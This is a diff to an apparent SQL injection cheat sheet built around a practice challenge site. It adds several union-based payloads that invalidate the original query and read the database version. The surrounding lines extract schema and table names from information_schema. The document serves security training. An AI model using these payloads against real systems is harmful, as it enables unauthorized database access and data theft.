@@ -158,13 +158,31 @@ OR
 
 Then the following codes will extract the databases'name, tables'name, columns'name.
 
+#### Various methods to make a QUERY INVALID  - Remember to use URL Encoded.
+
+```
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' and 0 union select 1,@@version,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' and false union select 1,@@version,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=-1' union select 1,@@version,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1000000' union select 1,@@version,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=null' union select 1,@@version,3--+
+
+http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1' && 0 union select 1,@@version,3--+
+
+```
+
 #### Extract DATABASE NAME
 
 `1' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c),3+fRoM+information_schema.schemata%23`
 
 OUTPUT:     leettime_761wHole
 
-#### Extract TABLES NAME
+#### Extract TABLES NAME  
 
 `1' UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C),3+fRoM+information_schema.tables+wHeRe+table_schema=database()%23`
 
